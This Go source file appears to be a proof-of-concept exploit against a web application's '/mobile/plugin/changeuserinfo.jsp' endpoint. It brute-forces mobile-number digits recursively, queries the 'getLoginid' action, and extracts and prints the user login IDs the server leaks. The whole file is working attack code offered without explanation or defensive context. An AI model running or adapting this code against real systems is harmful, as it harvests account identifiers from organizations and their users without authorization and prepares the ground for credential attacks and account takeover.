package poc

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"
)

func Getloginid(url string, mobile string, i int) int {
	mobile = mobile + fmt.Sprint(i)
	response, err := http.Get(url + "/mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=" + mobile)
	if err != nil {
		return 1
	}
	defer response.Body.Close()

	// Convert response body to string
	buffer := make([]byte, 4096)
	response.Body.Read(buffer)
	responseBody := string(buffer)

	if !(strings.Contains(responseBody, `"status":"1"`) || strings.Contains(responseBody, `"status":"0"`) || strings.Contains(responseBody, `"status":"-1"`)) {
		return 1
	}
	if !strings.Contains(responseBody, "status") {
		return 1
	}
	if strings.Contains(responseBody, "/images/error/404.png") || response.StatusCode != 200 {
		return 1
	}
	if strings.Contains(responseBody, `"status":"1"`) && !strings.Contains(responseBody, "loginId") {
		return 1
	}
	if strings.Contains(responseBody, "loginId") {

		reg := regexp.MustCompile("\"loginId\":.([^\\\"]+)")
		match := reg.FindStringSubmatch(responseBody)
		if len(match) > 1 {
			loginId := match[1]
			fmt.Println("loginId:", loginId) // 打印ID值
		}
	}
	if strings.Contains(responseBody, `"status":"-1"`) {
		return 0
	}
	for j := 0; j < 10; j++ {
		status := Getloginid(url, mobile, j)
		if status == 0 {
			continue
		} else if status == 2 {
			return 2
		}
	}
	return 1
}
